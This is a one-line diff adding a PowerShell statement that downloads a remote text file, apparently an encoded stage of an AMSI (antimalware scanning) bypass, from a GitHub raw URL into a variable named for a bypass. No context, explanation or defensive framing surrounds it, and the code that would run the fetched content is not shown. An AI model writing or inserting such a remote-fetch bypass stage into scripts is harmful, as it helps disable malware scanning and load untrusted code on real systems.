@@ -1,0 +1,1 @@
+$jonsbypassencoded = (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecurityJon/AMSITempTesting/master/stage5.txt");
